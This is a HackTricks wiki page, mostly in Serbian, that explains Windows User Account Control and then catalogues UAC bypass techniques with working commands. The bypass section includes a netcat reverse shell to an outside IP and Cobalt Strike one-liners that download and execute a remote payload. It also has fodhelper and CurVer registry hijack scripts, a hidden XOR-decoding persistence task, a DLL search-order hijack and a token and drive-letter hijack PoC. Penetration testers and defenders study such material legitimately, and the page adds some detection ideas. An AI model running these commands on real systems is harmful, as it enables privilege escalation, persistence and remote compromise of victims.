# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je feature koja omogućava **consent prompt za elevated aktivnosti**. Applications imaju različite `integrity` nivoe, a program sa **high level** može da obavlja zadatke koji **potencijalno mogu kompromitovati sistem**. Kada je UAC omogućen, applications i tasks uvek **rade pod security context-om naloga koji nije administrator** osim ako administrator eksplicitno ne autorizuje ove applications/tasks da imaju administrator-level access do sistema da bi se pokrenule. To je convenience feature koja štiti administratore od nenamernih promena, ali se ne smatra security boundary.

Za više informacija o integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Kada je UAC prisutan, administrator user dobija 2 tokena: standard user key, za obavljanje običnih akcija na regular level-u, i jedan sa admin privileges.

Ova [stranica](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) detaljno razmatra kako UAC funkcioniše i uključuje logon process, user experience i UAC architecture. Administrators mogu da koriste security policies da konfigurišu kako UAC radi specifično za njihovu organizaciju na local nivou (koristeći secpol.msc), ili da se konfigurše i distribuira kroz Group Policy Objects (GPO) u Active Directory domen okruženju. Različita podešavanja su detaljno opisana [ovde](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Postoji 10 Group Policy podešavanja koja mogu da se postave za UAC. Sledeća tabela pruža dodatne detalje:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

**Local security policies** ("secpol.msc" na većini sistema) su podrazumevano konfigurisane da **spreče non-admin users da instaliraju software**. To znači da čak i ako non-admin user može da preuzme installer za vaš software, neće moći da ga pokrene bez admin account-a.

### Registry Keys to Force UAC to Ask for Elevation

Kao standard user bez admin rights, možete obezbediti da „standard“ account bude **prompted for credentials by UAC** kada pokuša da obavi određene akcije. Ova akcija bi zahtevala izmenu određenih **registry keys**, za koje su vam potrebne admin permissions, osim ako postoji **UAC bypass**, ili je attacker već prijavljen kao admin.

Čak i ako je user u **Administrators** grupi, ove promene primoravaju user-a da **ponovo unese svoje account credentials** kako bi izvršio administrative actions.

**Jedina mana je što je za ovaj pristup potrebno da UAC bude disabled, što u produkcionim okruženjima verovatno nije slučaj.**

Registry keys i entries koje morate promeniti su sledeći (sa podrazumevanim vrednostima u zagradama):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Ovo se takođe može uraditi ručno kroz Local Security Policy tool. Nakon promene, administrative operations traže od user-a da ponovo unese svoje credentials.

### Note

**User Account Control is not a security boundary.** Therefore, standard users cannot break out of their accounts and gain administrator rights without a local privilege escalation exploit.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode koristi integrity checks da spreči procese sa high-integrity-level (kao što su web browsers) da pristupe podacima sa low-integrity-level (kao što je temporary Internet files folder). Ovo se radi pokretanjem browsera sa low-integrity token. Kada browser pokuša da pristupi podacima uskladištenim u low-integrity zoni, operativni sistem proverava integrity level procesa i dozvoljava pristup u skladu sa tim. Ova funkcija pomaže da se spreče remote code execution attacks da dobiju pristup osetljivim podacima na sistemu.
- Kada se user prijavi na Windows, sistem kreira access token koji sadrži listu user-ovih privileges. Privileges se definišu kao kombinacija user-ovih rights i capabilities. Token takođe sadrži listu user-ovih credentials, koji se koriste za autentifikaciju user-a na computer i na resources na network.

### Autoadminlogon

Da biste konfigurisali Windows da automatski prijavi određenog user-a pri startup-u, postavite **`AutoAdminLogon` registry key**. Ovo je korisno za kiosk environments ili za testing purposes. Koristite ovo samo na secure systems, jer izlaže password u registry.

Postavite sledeće keys koristeći Registry Editor ili `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Da biste vratili normalno logon ponašanje, postavite `AutoAdminLogon` na 0.

## UAC bypass

> [!TIP]
> Imajte na umu da, ako imate graphical access do victim, UAC bypass je straightforward jer jednostavno možete kliknuti na "Yes" kada se pojavi UAC prompt

UAC bypass je potreban u sledećoj situaciji: **UAC je aktiviran, vaš process radi u medium integrity context, a vaš user pripada administrators group**.

Važno je napomenuti da je **mnogo teže bypass-ovati UAC ako je na najvišem security level-u (Always) nego ako je na bilo kom drugom level-u (Default).**

### UAC disabled

Ako je UAC već disabled (`ConsentPromptBehaviorAdmin` je **`0`**) možete **izvršiti reverse shell sa admin privileges** (high integrity level) koristeći nešto poput:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Veoma** osnovni UAC "bypass" (potpuni pristup file systemu)

Ako imate shell sa korisnikom koji je unutar Administrators grupe, možete lokalno **mountovati C$** deljeni resurs preko SMB (file system) kao novi disk i imaćete **pristup svemu unutar file systema** (čak i Administrator home folderu).

> [!WARNING]
> **Izgleda da ovaj trik više ne radi**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass sa cobalt strike

Tehnike Cobalt Strike će raditi samo ako UAC nije podešen na svoj maksimalni nivo bezbednosti
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** takođe imaju nekoliko modula za **bypass** **UAC**.

### KRBUACBypass

Dokumentacija i alat na [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) što je **kompilacija** nekoliko UAC bypass exploits. Imajte na umu da ćete morati da **kompajlirate UACME koristeći visual studio ili msbuild**. Kompilacija će kreirati nekoliko izvršnih fajlova (kao `Source\Akagi\outout\x64\Debug\Akagi.exe`) , moraćete da znate **koji vam je potreban.**\
Treba da budete **pažljivi** jer neki bypasses će **pokrenuti neke druge programe** koji će **upozoriti** **korisnika** da se nešto dešava.

UACME ima **build verziju od koje je svaka tehnika počela da radi**. Možete da potražite tehniku koja utiče na vaše verzije:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Takođe, koristeći [this](https://en.wikipedia.org/wiki/Windows_10_version_history) stranicu dobijaš Windows izdanje `1607` iz verzija buildova.

### UAC Bypass – fodhelper.exe (Registry hijack)

Pouzdani binarni fajl `fodhelper.exe` je auto-elevated na modernom Windows-u. Kada se pokrene, proverava sledeću registry putanju po korisniku bez validacije `DelegateExecute` glagola. Postavljanje komande tamo omogućava Medium Integrity procesu (korisnik je u Administrators) da pokrene High Integrity proces bez UAC prompta.

Registry putanja koju proverava fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell koraci (postavi svoj payload, pa pokreni)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Napomene:
- Radi kada je trenutni korisnik član Administrators i UAC nivo je podrazumevan/lenient (nije Always Notify sa dodatnim restrikcijama).
- Koristite `sysnative` path da pokrenete 64-bitni PowerShell iz 32-bitnog procesa na 64-bitnom Windows-u.
- Payload može biti bilo koja komanda (PowerShell, cmd, ili EXE path). Izbegavajte prompt UIs radi stealth.

#### CurVer/extension hijack variant (HKCU only)

Nedavni samples koji abuse-uju `fodhelper.exe` izbegavaju `DelegateExecute` i umesto toga **preusmeravaju `ms-settings` ProgID** preko per-user `CurVer` value. Auto-elevated binary i dalje resolvuje handler pod `HKCU`, tako da nije potreban admin token da bi se postavili ključevi:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Jednom kada se elevate-uje, malware često **onemogućava buduće promptove** tako što postavlja `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, zatim sprovodi dodatni defense evasion (npr. `Add-MpPreference -ExclusionPath C:\ProgramData`) i ponovo kreira persistence da bi se izvršavao kao high integrity. Tipičan persistence task čuva **XOR-enkriptovani PowerShell script** na disku i dekodira ga/izvršava u memoriji svaki sat:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Ova varijanta i dalje čisti dropper i ostavlja samo staged payloads, pa detekcija zavisi od praćenja **`CurVer` hijack**-a, `ConsentPromptBehaviorAdmin` tampering-a, kreiranja Defender exclusion-a, ili scheduled tasks koji u memoriji dešifruju PowerShell.

#### More UAC bypass

**Sve** tehnike korišćene ovde za zaobilaženje AUC **zahtevaju** **full interactive shell** sa žrtvom (običan nc.exe shell nije dovoljan).

Možete ga dobiti pomoću **meterpreter** sesije. Migrirajte na **process** koji ima **Session** vrednost jednaku **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ bi trebalo da radi)

### UAC Bypass with GUI

Ako imate pristup **GUI**-ju, možete jednostavno prihvatiti UAC prompt kada se pojavi, zapravo vam i nije potreban bypass. Dakle, pristup GUI-ju će vam omogućiti da zaobiđete UAC.

Štaviše, ako dobijete GUI sesiju koju je neko koristio (potencijalno preko RDP), postoje **neki alati koji će se pokretati kao administrator** iz kojih biste mogli direktno da **pokrenete** na primer **cmd** **kao admin** bez ponovnog prompta od strane UAC-a, kao što je [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo može biti malo **stealthy**.

### Noisy brute-force UAC bypass

Ako vas nije briga da budete noisy, uvek možete **pokrenuti nešto poput** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) koje će **tražiti elevaciju privilegija dok korisnik ne prihvati**.

### Your own bypass - Basic UAC bypass methodology

Ako pogledate **UACME**, primetićete da **većina UAC bypass-ova zloupotrebljava Dll Hijacking vulnerabilit**y (uglavnom upisivanjem malicious dll u _C:\Windows\System32_). [Pročitajte ovo da naučite kako da pronađete Dll Hijacking vulnerabilitiy](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Pronađite binary koji će se **autoelevate** (proverite da, kada se izvrši, radi na visokom integrity level-u).
2. Uz procmon pronađite događaje "**NAME NOT FOUND**" koji mogu biti ranjivi na **DLL Hijacking**.
3. Verovatno ćete morati da **upisujete** DLL unutar nekih **protected paths** (kao što je C:\Windows\System32) gde nemate prava upisa. Ovo možete zaobići koristeći:
1. **wusa.exe**: Windows 7,8 i 8.1. Omogućava ekstrakciju sadržaja CAB fajla unutar protected paths (jer se ovaj alat izvršava sa visokim integrity level-om).
2. **IFileOperation**: Windows 10.
4. Pripremite **script** za kopiranje vašeg DLL-a unutar protected path-a i izvršavanje ranjivog i autoelevated binary-ja.

### Another UAC bypass technique

Sastoji se od praćenja da li **autoElevated binary** pokušava da **čita** iz **registry-ja** **ime/path** nekog **binary-ja** ili **command**-a koji treba da bude **executed** (ovo je zanimljivije ako binary pretražuje ove informacije unutar **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

32-bitni `C:\Windows\SysWOW64\iscsicpl.exe` je **auto-elevated** binary koji može da se zloupotrebi za učitavanje `iscsiexe.dll` preko search order-a. Ako možete da postavite malicious `iscsiexe.dll` unutar foldera koji je **user-writable** i zatim izmenite current user `PATH` (na primer preko `HKCU\Environment\Path`) tako da se taj folder pretražuje, Windows može da učita attacker DLL unutar elevated `iscsicpl.exe` procesa **bez prikazivanja UAC prompt-a**.

Praktične napomene:
- Ovo je korisno kada je current user u **Administrators**, ali radi na **Medium Integrity** zbog UAC-a.
- Kopija iz **SysWOW64** je relevantna za ovaj bypass. Tretirajte kopiju iz **System32** kao zaseban binary i validirajte ponašanje nezavisno.
- Primitiv je kombinacija **auto-elevation** i **DLL search-order hijacking**, pa je isti ProcMon workflow koji se koristi za druge UAC bypass-ove koristan za validaciju nedostajućeg DLL load-a.

Minimal flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection ideas:
- Alert on `reg add` / registry writes to `HKCU\Environment\Path` immediately followed by execution of `C:\Windows\SysWOW64\iscsicpl.exe`.
- Hunt for `iscsiexe.dll` in **user-controlled** locations such as `%TEMP%` or `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlate `iscsicpl.exe` launches with unexpected child processes or DLL loads from outside the normal Windows directories.

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” uses shadow-admin tokens with per-session `\Sessions\0\DosDevices/<LUID>` maps. The directory is created lazily by `SeGetTokenDeviceMap` on first `\??` resolution. If the attacker impersonates the shadow-admin token only at **SecurityIdentification**, the directory is created with the attacker as **owner** (inherits `CREATOR OWNER`), allowing drive-letter links that take precedence over `\GLOBAL??`.

**Steps:**

1. From a low-privileged session, call `RAiProcessRunOnce` to spawn a promptless shadow-admin `runonce.exe`.
2. Duplicate its primary token to an **identification** token and impersonate it while opening `\??` to force creation of `\Sessions\0\DosDevices/<LUID>` under attacker ownership.
3. Create a `C:` symlink there pointing to attacker-controlled storage; subsequent filesystem accesses in that session resolve `C:` to the attacker path, enabling DLL/file hijack without a prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
